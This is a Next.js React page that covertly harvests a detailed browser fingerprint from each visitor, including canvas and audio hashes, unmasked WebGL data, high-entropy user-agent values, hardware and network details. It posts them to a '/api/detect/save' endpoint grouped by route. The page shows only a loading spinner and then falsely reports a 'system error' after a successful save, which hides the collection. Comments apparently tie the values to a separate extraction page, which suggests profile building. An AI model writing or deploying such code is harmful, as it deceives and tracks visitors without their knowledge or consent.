'use client';

import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';

export default function DetectPage() {
  const params = useParams();
  const [status, setStatus] = useState('加载中...');

  useEffect(() => {
    // 提取设备信息并保存
    const extractAndSave = async () => {
      try {
        // 从路由参数获取分组
        const group = (params?.group as string) || 'default';

        // 检测平台
        const detectPlatform = () => {
          const ua = navigator.userAgent;
          if (/iPhone|iPad|iPod/.test(ua)) {
            return 'ios';
          } else if (/Android/.test(ua)) {
            return 'android';
          }
          return 'unknown';
        };

        // 获取 WebGL 信息
        const getWebGLInfo = () => {
          try {
            const canvas = document.createElement('canvas');
            const gl = (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')) as WebGLRenderingContext | null;
            if (!gl) return { renderer: null, vendor: null };
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
              return {
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
              };
            }
            return { renderer: null, vendor: null };
          } catch (e) {
            return { renderer: null, vendor: null };
          }
        };

        // 获取 Canvas 指纹
        const getCanvasFingerprint = () => {
          try {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            if (!ctx) return null;
            
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Device fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Device fingerprint', 4, 17);
            
            const dataURL = canvas.toDataURL();
            // 计算一个简单的哈希值作为噪声种子（与 extract-device-data.html 保持一致）
            let hash = 0;
            for (let i = 0; i < dataURL.length; i++) {
              hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
              hash = hash & hash;
            }
            return Math.abs(hash) / 10000000000; // 归一化到 0-1 范围
          } catch (e) {
            return null;
          }
        };

        // 获取 AudioContext 指纹
        const getAudioContextFingerprint = async () => {
          try {
            const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            
            gainNode.gain.value = 0;
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            oscillator.start(0);
            
            return new Promise<number>((resolve) => {
              scriptProcessor.onaudioprocess = (e: any) => {
                const output = e.inputBuffer.getChannelData(0);
                let sum = 0;
                for (let i = 0; i < output.length; i++) {
                  sum += Math.abs(output[i]);
                }
                const avg = sum / output.length;
                oscillator.stop();
                audioContext.close();
                resolve(Math.abs(avg * 1000000)); // 归一化（与 extract-device-data.html 保持一致）
              };
              setTimeout(() => {
                oscillator.stop();
                audioContext.close();
                resolve(Math.random());
              }, 100);
            });
          } catch (e) {
            return Promise.resolve(Math.random());
          }
        };

        // 获取网络信息
        const getNetworkInfo = () => {
          const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
          if (connection) {
            return {
              type: connection.type || 'unknown',
              effectiveType: connection.effectiveType || 'unknown',
              downlink: connection.downlink || null,
              rtt: connection.rtt || null
            };
          }
          return {
            type: 'unknown',
            effectiveType: 'unknown',
            downlink: null,
            rtt: null
          };
        };

        // 提取操作系统版本
        const extractOSVersion = (ua: string) => {
          if (/iPhone OS (\d+[._]\d+)/.test(ua)) {
            const match = ua.match(/iPhone OS (\d+[._]\d+)/);
            return match ? match[1].replace('_', '.') : 'unknown';
          }
          if (/Android (\d+)/.test(ua)) {
            const match = ua.match(/Android (\d+)/);
            return match ? match[1] : 'unknown';
          }
          return 'unknown';
        };

        // 提取浏览器版本
        const extractBrowserVersion = (ua: string) => {
          if (/Version\/(\d+[._]\d+)/.test(ua)) {
            const match = ua.match(/Version\/(\d+[._]\d+)/);
            return match ? match[1] : 'unknown';
          }
          if (/Chrome\/(\d+)/.test(ua)) {
            const match = ua.match(/Chrome\/(\d+)/);
            return match ? match[1] + '.0.0.0' : 'unknown';
          }
          return 'unknown';
        };

        // 提取浏览器名称
        const extractBrowserName = (ua: string) => {
          if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
            return 'Safari';
          }
          if (/Chrome/.test(ua)) {
            return 'Chrome';
          }
          return 'Unknown';
        };

        setStatus('加载中...');
        const platform = detectPlatform();
        const webgl = getWebGLInfo();
        const canvasNoise = getCanvasFingerprint();
        const audioSeed = await getAudioContextFingerprint();
        const network = getNetworkInfo();
        const ua = navigator.userAgent;

        // 提取 userAgentData（如果存在）
        let userAgentData: any = null;
        if ((navigator as any).userAgentData) {
          try {
            const baseData = {
              platform: (navigator as any).userAgentData.platform || null,
              brands: (navigator as any).userAgentData.brands || [],
              mobile: (navigator as any).userAgentData.mobile !== undefined ? (navigator as any).userAgentData.mobile : null
            };
            
            if (typeof (navigator as any).userAgentData.getHighEntropyValues === 'function') {
              try {
                const highEntropyValues = await Promise.race([
                  (navigator as any).userAgentData.getHighEntropyValues([
                    'platform', 'platformVersion', 'model', 'mobile', 
                    'architecture', 'bitness', 'fullVersion', 'fullVersionList', 
                    'uaFullVersion', 'wow64'
                  ]),
                  new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 1000))
                ]) as any;
                userAgentData = {
                  ...baseData,
                  ...highEntropyValues
                };
              } catch (e) {
                userAgentData = baseData;
              }
            } else {
              userAgentData = baseData;
            }
          } catch (e) {
            console.warn('Failed to extract userAgentData:', e);
          }
        }

        // 生成六位随机编码
        const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
        const deviceName = `${platform}-${randomCode}`;

        // 构建设备配置
        const deviceConfig = {
          name: deviceName,
          platform: platform,
          group: group,
          hardware: {
            cpuCores: navigator.hardwareConcurrency,
            memory: (navigator as any).deviceMemory || (platform === 'ios' ? undefined : 8),
            screenWidth: screen.width,
            screenHeight: screen.height,
            devicePixelRatio: window.devicePixelRatio,
            colorDepth: screen.colorDepth
          },
          system: {
            osVersion: extractOSVersion(ua),
            platform: navigator.platform
          },
          browser: {
            userAgent: ua,
            version: extractBrowserVersion(ua),
            name: extractBrowserName(ua),
            vendor: navigator.vendor,
            ...(userAgentData ? { userAgentData: userAgentData } : {})
          },
          fingerprint: {
            ...(platform === 'android' && (navigator as any).deviceMemory ? {
              deviceMemory: (navigator as any).deviceMemory
            } : {}),
            hardwareConcurrency: navigator.hardwareConcurrency,
            maxTouchPoints: navigator.maxTouchPoints,
            webglRenderer: webgl.renderer,
            webglVendor: webgl.vendor,
            canvasNoise: canvasNoise,
            audioContextSeed: audioSeed,
            connectionType: network.type,
            effectiveType: network.effectiveType,
            downlink: network.downlink,
            rtt: network.rtt
          }
        };

        setStatus('加载中...');
        
        // 发送到 API 保存
        const response = await fetch('/api/detect/save', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(deviceConfig),
        });

        if (response.ok) {
          setStatus('系统异常');
          // 3秒后可以关闭页面或跳转
          setTimeout(() => {
            setStatus('系统异常');
          }, 3000);
        } else {
          const error = await response.json();
          setStatus(`系统异常: ${error.error || '未知错误'}`);
        }
      } catch (error: any) {
        setStatus(`错误: ${error.message || '未知错误'}`);
      }
    };

    extractAndSave();
  }, []);

  return (
    <div className="min-h-screen bg-background flex items-center justify-center">
      <div className="text-center">
        <div className="inline-block w-8 h-8 border-4 border-primary border-t-transparent rounded-full animate-spin mb-4"></div>
        <p className="text-sm text-muted-foreground">{status}</p>
      </div>
    </div>
  );
}

